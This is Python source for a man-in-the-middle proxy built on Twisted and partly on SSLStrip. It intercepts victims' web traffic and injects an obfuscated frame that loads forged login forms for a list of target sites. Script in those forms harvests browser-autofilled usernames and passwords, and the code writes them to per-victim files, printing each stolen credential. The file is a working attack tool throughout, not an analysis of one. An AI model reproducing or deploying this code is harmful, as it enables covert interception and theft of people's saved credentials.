
import urlparse, logging, os, sys, random

from twisted.web.http import Request
from twisted.web.http import HTTPChannel
from twisted.web.http import HTTPClient

from twisted.internet import ssl
from twisted.internet import defer
from twisted.internet import reactor
from twisted.internet.protocol import ClientFactory

from ServerConnectionFactory import ServerConnectionFactory
from ServerConnection import ServerConnection
from SSLServerConnection import SSLServerConnection
from URLMonitor import URLMonitor
from CookieCleaner import CookieCleaner
from DnsCache import DnsCache

class ClientRequest(Request):

    ''' This class represents incoming client requests and is essentially where
    the magic begins.  Here we remove the client headers we dont like, and then
    respond with either favicon spoofing, session denial, or proxy through HTTP
    or SSL to the server.
    '''    
    
    def __init__(self, channel, queued, reactor=reactor):
        Request.__init__(self, channel, queued)
        self.reactor       = reactor
        self.urlMonitor    = URLMonitor.getInstance()
        self.cookieCleaner = CookieCleaner.getInstance()
        self.dnsCache      = DnsCache.getInstance()
#       self.uniqueId      = random.randint(0, 10000)

    def cleanHeaders(self):
        
        headers = self.getAllHeaders().copy()
        
        if 'accept-encoding' in headers:
            del headers['accept-encoding']

        if 'if-modified-since' in headers:
            del headers['if-modified-since']

        if 'cache-control' in headers:
            del headers['cache-control']

        return headers

    def getPathFromUri(self):
        if (self.uri.find("http://") == 0):
            index = self.uri.find('/', 7)
            return self.uri[index:]

        return self.uri        

     
    def isCompromised(self,victims,client):
        if victims.find(client) != -1:
            return True
        else: 
            return False  
             

    def skipThis(self,path):
        if len(path) < 50 and path.find(".") == -1:
            return False 
        return True     
   


    def obfuscate(self,string):
        obfs = ""
        for letter in string:
            obfs+=str(ord(letter)+255)+"."

        return obfs[:-1]

    def saveCreds(self,client):

        uri = self.getPathFromUri()
        k = uri.find("Framinator=")
        uri=uri[15:]
        #print "URI:"+uri
        if len(uri) == 0:
            print "STOLE NOTHING"
            return

        uri=uri.split("|||||")

        try:

           clientFile = open("vics/"+client,'a+')

           for cred in uri:
              clientFile.write(cred[1:]+"\n")
              print "STOLE: "+cred[1:]
           clientFile.close()

        except IOError as (errno, strerror):
           print "WTFFF"

    def handleHostResolvedSuccess(self, address):
        logging.debug("Resolved host successfully: %s -> %s" % (self.getHeader('host'), address))

        host              = self.getHeader("host")
        client            = self.getClientIP()
        path              = self.getPathFromUri()

        self.content.seek(0,0)
        postData          = self.content.read()
        url               = 'http://' + host + path
        headers           = self.cleanHeaders()


        vics = open("vics/allvics",'r+')
        victims = vics.read()        

        if path.find("Framinator=") != -1:
            self.saveCreds(client)
            actAs = "finisher"   
        else:
            tag = url.find("q=12345") 
            if tag == -1:          
               if self.skipThis(path) == True or self.isCompromised(victims,client) == True:
                  #print 'proxy '+url
                  actAs = "proxy"
               else:
                  actAs = "framer"
                  print "FRAME: "+url
                  #vics.write(client+";")                       
            else:   
               #print "CLIENT_REQUEST steal "+url
               actAs = "thief"
            
        vics.close()               
              
        #Moxie Marlinspikes Code, from SSLStrip      
        self.dnsCache.cacheResolution(host, address)

        if(actAs == "thief"):
           tmp = path.find("q=12345")
           path = path[:tmp-1]
           if(len(path) > 1):
              host += path
           self.sendForgery(host) 
        elif(actAs == "finisher"):
           self.sendWrapUp()
        else:
           if (not self.cookieCleaner.isClean(self.method, client, host, headers)):
              logging.debug("Sending expired cookies...")
              self.sendExpiredCookies(host, path, self.cookieCleaner.getExpireHeaders(self.method, client,host, headers, path))
             
           if (self.urlMonitor.isSecureLink(client, url)):
              logging.debug("Sending request via SSL...")
              self.proxyViaSSL(address, self.method, path, postData, actAs,headers,self.urlMonitor.getSecurePort(client, url))
           else:
              logging.debug("Sending request via HTTP...")
              self.proxyViaHTTP(address, self.method, path, postData,actAs, headers)           



    def handleHostResolvedError(self, error):
        logging.warning("Host resolution error: " + str(error))
        self.finish()

    def resolveHost(self, host):
        address = self.dnsCache.getCachedAddress(host)

        if address != None:
            logging.debug("Host cached.")
            return defer.succeed(address)
        else:
            logging.debug("Host not cached.")
            return reactor.resolve(host)

    def process(self):

        host     = self.getHeader('host') 
        path     = self.getPathFromUri()           
        if("framer.html" in path):
           self.sendMaster()
        else:
           logging.debug("Resolving host: %s" % host)          
           deferred = self.resolveHost(host)
           deferred.addCallback(self.handleHostResolvedSuccess)
           deferred.addErrback(self.handleHostResolvedError)
        
    def proxyViaHTTP(self, host, method, path, postData,actAs,headers):

        connectionFactory          = ServerConnectionFactory(method, path, postData, actAs,headers,self)
   
        connectionFactory.protocol = ServerConnection
             
        self.reactor.connectTCP(host, 80, connectionFactory)

    def proxyViaSSL(self, host, method, path, postData, actAs,headers,port):

        clientContextFactory       = ssl.ClientContextFactory()
        connectionFactory          = ServerConnectionFactory(method, path, postData,actAs, headers, self)
            
        connectionFactory.protocol = ServerConnection
        
        self.reactor.connectSSL(host, port, connectionFactory, clientContextFactory)
    def sendExpiredCookies(self, host, path, expireHeaders):
        self.setResponseCode(302, "Moved")
        self.setHeader("Connection", "close")
        self.setHeader("Location", "http://" + host + path)
        
        for header in expireHeaders:
            self.setHeader("Set-Cookie", header)
        self.finish()   


    def getAction(self,host):
        fil = open("sites");
        action = "\"\"";
        for filelineno, line in enumerate(fil):
            line = line[:-1]
            line = line.split("|")

            if host == line[0]:
               if len(line[1]) > 0:
                  action = "\""+line[1]+"\""
               else:
                  action = "\"http://"+host+"\""
               break
        fil.close()
        return action

    def sendForgery(self,host):

        self.setResponseCode(200, "OK")
        actionURL = self.getAction(host) 
        print "HOST: "+host
        form = "<form method=\"POST\" action="+actionURL+"><input type=\"text\" name=\"user\"/><input type=\"password\" name=\"pass\"/></form>"

        sendCreds = "function sendCreds(creds){ \
                        window.parent.postMessage(window.name+\'$$$\'+creds,\'*\'); \
                     };"

        go =        "function go(){ \
                        user=document.getElementsByName(\'user\')[0].value; \
                        pass=document.getElementsByName(\'pass\')[0].value; \
                        host=location.hostname; \
                        if(pass.length > 0){ \
                           sendCreds(host+\',\'+user+\',\'+pass); \
                        }else{ \
                           sendCreds(\"\"); \
                        }; \
                     };" \

        js="<script type=\"text/javascript\">"+sendCreds+go+"setTimeout(\"go()\",100);</script>"
       
        data = "<html><head></head><body>"+form+js+"</body></html>"
        self.write(data)

        self.finish()      
  
        
    def sendWrapUp(self):
        self.setResponseCode(200, "OK")
        self.setHeader("Connection", "close") 

        js = "<script type=\"text/javascript\">  \
                window.parent.postMessage(\"destroy masterFrame\",\"*\") \
              </script>"

        data = "<html><head>"+js+"</head><body></body></html>"
        self.write(data)    
        self.finish()        


    def sendMaster(self):
        self.setResponseCode(200, "OK")
        self.setHeader("Connection", "keep-alive")
        master = open("framer.html",'r+')
        frame = master.read()
        master.close()
        idx = frame.find("text/javascript")
        idx2 = frame[idx:].find(">")
        one = frame[:idx+idx2+1]

        two = ""
        obfs_two=""
        three = frame[idx+idx2+2:]
         
        fil = open("sites")
        for filelineno,line in enumerate(fil):
            line = line[:-1]
            ho = line            
            line = line.split("|")
            ho = line[0]; 

            if ho.find("http://") != -1:
               ho = ho[7:]         
            sep = "?"
            if ho.find("?") != -1:
               sep = "&"
            two="http://"+ho+sep+"q=12345"
            obfs_two+="\""
            obfs_two += self.obfuscate(two)
            obfs_two += "\","
        fil.close() 
        self.write(one+"var targets=["+obfs_two[:-1]+"];"+three)
        
        #self.write(one+"var targets=["+two[:-1]+"];"+three)

        self.finish()
